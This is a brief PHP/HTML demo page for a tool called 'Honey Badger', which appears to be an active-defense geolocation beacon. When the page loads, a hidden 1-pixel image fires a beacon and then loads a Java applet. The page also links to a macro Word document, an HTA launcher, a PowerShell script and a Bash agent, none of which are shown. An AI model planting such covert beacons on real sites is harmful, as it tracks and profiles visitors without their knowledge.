<!doctype html>
<?php

function url(){
  return explode("/demo.php", sprintf(
    "%s://%s%s",
    isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',
    $_SERVER['SERVER_NAME'],
    $_SERVER['REQUEST_URI']
  ))[0];
}


?>

<head>
<script type="text/javascript" src="honey.js"></script>
<style>
.o {margin:25px;position:relative;text-align:center;}
.g, h1 {text-align:center;margin-left:auto;margin-right:auto;position:relative;width:90%;}
</style>
</head>
<body>
<h1>This is the Demo page for the crazy, nastyass "Honey Badger".</h1>
<img src="<?php echo url(); ?>/service.php?target=Demo_Page&agent=HTML" onerror="go('<?php echo url(); ?>/service.php','Demo_Page','honey.jar',true,true,5000);" width="1px" height="1px" />

<br />
<div class="g" >
	<a class="o" href="retrieve.php?docm" >Doc File</a>
	<a class="o" href="retrieve.php?hta" >HTA Launcher</a>
	<a class="o" href="retrieve.php?ps1d" >Powershell Script</a>
	<a class="o" href="retrieve.php?sh" >Bash</a>
</div>

</body>
</html>
